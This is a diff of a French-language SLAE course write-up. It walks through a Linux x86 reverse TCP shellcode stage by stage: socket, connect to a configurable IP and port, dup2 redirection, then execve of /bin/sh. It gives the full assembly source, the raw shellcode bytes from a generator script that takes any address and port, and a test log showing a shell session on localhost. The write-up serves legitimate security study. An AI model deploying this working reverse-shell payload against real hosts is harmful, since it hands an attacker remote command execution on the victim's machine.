@@ -8,29 +8,30 @@ L'idée ici est dans un premier temps de créer un socket puis d'établir une co
 La principale référence bibliographique est la documentation des appels systèmes http://man7.org/linux/man-pages/man2/socketcall.2.html. L'appel socketcall est utilisé pour définir les actions sur les sockets en fonction du champ call. La valeur 1 indique que c'est la création d'un socket qui nous interesse. Il s'agit ici d'indiquer un domain, un type et un protocol. Nous prenons le protocol IP de type SOCK_STREAM et le domain IPPROTO_IP = 0.
 
 ```c
-	xor ebx, ebx
-	mul ebx
-	push ebx
-	inc ebx		;socket
-	push ebx
-	push 0x2
-	mov ecx, esp	;*args
-	mov al, 0x66
-	int 0x80
+	xor ebx, ebx 			; ebx = 0
+	mul ebx				; eax=ebx=edx = 0
+	push ebx			; push 0 onto the stack
+	inc ebx				; ebx = 1
+	push ebx			; push 1 onto the stack
+	push byte 0x2			; push 2 onto the stack
+	mov ecx, esp			; set ecx to the address of our args
+	mov al, 0x66			; syscall socketcall
+	int 0x80			; make the syscall socketcall(socket(2,1,0))
 ```
+
 ## Création de la connexion ##
 Nous procédons de la même manière pour créer la connexion en indiquant l'adresse IP et le port logique. Nous nous sommes appuyé sur la structure sockaddr afin de connaître les différents élément necessaires.
 
 ```c
-	push 0x0101017f	; @Ip 127.1.1.1
-	push dword 0x5c11 ; Port 4444
+	push 0x0101017f			; @Ip 127.1.1.1
+	push dword 0x5c11 		; Port 4444
 	inc ebx
-    	push word bx      ; Ajout de AF_INET et pour eviter d'avoir un null byte
+    	push word bx     		; Ajout de AF_INET et pour eviter d'avoir un null byte
     	mov ecx, esp	
-	push 0x10	; addrlen
-	push ecx	; struct *addr
-	push edx	; sockfd
-	mov bl, 0x3	; connect call
+	push 0x10			; addrlen
+	push ecx			; struct *addr
+	push edx			; sockfd
+	mov bl, 0x3			; connect call
 	mov ecx, esp	
 	mov al, 0x66
 	int 0x80
@@ -41,10 +42,10 @@ Nous procédons de la même manière pour créer la connexion en indiquant l'adr
 Ici, nous redirigeons les 3 sorties vers le socket via l'appel système dup2.
 
 ```c
-	xor ecx, ecx
-	mov cl, 0x2
+	xor ecx, ecx				; set ecx to 0
+	mov cl, 0x2				; ecx = 2
 _:
-	mov al, 0x3f
+	mov al, 0x3f				; syscall dup2
 	int 0x80
 	dec ecx
 	jns _
@@ -57,14 +58,14 @@ Il sera de la forme execve("/bin/sh", NULL, NULL).
 Puis enfin, le shell(/bin/bash) est exécuté une fois la connexion établie.
 
 ```c
-	xor ecx, ecx
-	mov edx, ecx
-	push edx
-	push 0x68732f2f
+	xor ecx,ecx				; ecx = 0
+	mul ecx					; eax = edx =ecx = 0
+	push eax				; push 0 onto the stack
+	push 0x68732f2f				; push //bin/sh
 	push 0x6e69622f
-	mov ebx, esp
-	mov al, 0xb
-	int 0x80
+	mov ebx, esp				; save esp into ebx
+	mov al, 0xb		
+	int 0x80				; make the syscall execve("/bin/sh", NULL, NULL)
 ```
 
 
@@ -72,10 +73,13 @@ Puis enfin, le shell(/bin/bash) est exécuté une fois la connexion établie.
 ## Code complet ##
 
 ```c
-; Shell_reverse_Tcp shellcode
-; Author: Alain Menelet
+; SLAE - Assignment 2: Shell_reverse_Tcp shellcode (Linux/x86)
+; Author: Alain Menelet 
+; StudentID - SLAE-3763
+; Tested on Ubuntu 16.14.03 LTS
+; https://github.com/xophidia/Shellcode/blob/master/compile.sh
 ; Taille : 74 bytes
-; 2017
+
 
 
 global _start
@@ -93,34 +97,33 @@ _start:
 	; for type SOCK_STREAM(0x1)
 	; for protocol IP (0x0)	
 
-	xor ebx, ebx
-	mul ebx
-	push ebx
-	inc ebx		;socket
-	push ebx
-	push 0x2
-	mov ecx, esp	;*args
-	mov al, 0x66
-	int 0x80
+	xor ebx, ebx 			; ebx = 0
+	mul ebx				; eax=ebx=edx = 0
+	push ebx			; push 0 onto the stack
+	inc ebx				; ebx = 1
+	push ebx			; push 1 onto the stack
+	push byte 0x2			; push 2 onto the stack
+	mov ecx, esp			; set ecx to the address of our args
+	mov al, 0x66			; syscall socketcall
+	int 0x80			; make the syscall socketcall(socket(2,1,0))
 
-	; we need to save the result of socket function for later usage
+	xchg edx, eax			; we need to save the result of socket function for later usage
 
-	xchg edx, eax
-
+	
 	; création de la connexion
 	; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
 	; we save sockfd just before
 	; sockaddr structure
 
-	push 0x0101017f	; @Ip 127.0.0.1
-	push dword 0x5c11 ; Port 4444
+	push 0x0101017f			; @Ip 127.0.0.1
+	push dword 0x5c11 		; Port 4444
 	inc ebx
-    push word bx      ; Ajout de AF_INET et pour eviter d'avoir un null byte
-    mov ecx, esp	
-	push 0x10	; addrlen
-	push ecx	; struct *addr
-	push edx	; sockfd
-	mov bl, 0x3	; connect call
+    	push word bx     		; Ajout de AF_INET et pour eviter d'avoir un null byte
+    	mov ecx, esp	
+	push 0x10			; addrlen
+	push ecx			; struct *addr
+	push edx			; sockfd
+	mov bl, 0x3			; connect call
 	mov ecx, esp	
 	mov al, 0x66
 	int 0x80
@@ -131,9 +134,9 @@ _start:
 	; int dup2(int oldfd, int newfd);
 
 	xor ecx, ecx
-	mov cl, 0x2
+	mov cl, 0x2				; ecx = 2
 _:
-	mov al, 0x3f
+	mov al, 0x3f				; syscall dup2
 	int 0x80
 	dec ecx
 	jns _
@@ -142,22 +145,24 @@ _:
 	; execve
 	; execute un shell /bin/bash des la connexion réussie
 
-	xor ecx, ecx	;argv = 0
-	mov edx, ecx	;envp = 0
-	push edx
-	push 0x68732f2f
+	xor ecx,ecx				; ecx = 0
+	mul ecx					; eax = edx =ecx = 0
+	push eax				; push 0 onto the stack
+	push 0x68732f2f				; push //bin/sh
 	push 0x6e69622f
-	mov ebx, esp
-	mov al, 0xb
-	int 0x80	
+	mov ebx, esp				; save esp into ebx
+	mov al, 0xb		
+	int 0x80				; make the syscall execve("/bin/sh", NULL, NULL)
 
 ```
 
 ## Exécution ##
 
+Nous utilisons comme dans le premier exercice le fichier test_shellcode.c avec les mêmes options de compilation.
+
 Sur le premier terminal:
 ```
-./shellcode.c
+./test_shellcode
 ```
 
 Sur le second terminal: 
@@ -200,7 +205,7 @@ if __name__=='__main__':
 ### Test ###
 
 ```c
-./reverse_script.py --address 127.1.1.1 --port 1234
+./createShellcode.py --address 127.1.1.1 --port 1234
 "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x92\x68\x7f\x01\x01\x01\x66\x68\x04\xd2\x43\x66\x53\x89\xe1\x6a\x10
 \x51\x52\xb3\x03\x89\xe1\xb0\x66\xcd\x80\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc9\x89\xca\x52\x68\x2f\x2f\x73\x68\x68
 \x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80";
@@ -215,3 +220,9 @@ Connection from [127.0.0.1] port 1234 [tcp/*] accepted (family 2, sport 40102)
 id
 uid=1000(xophidia) gid=1000(xophidia) groups=1000(xophidia),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
 ```
+
+This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
+
+http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
+
+StudentID - SLAE-3763
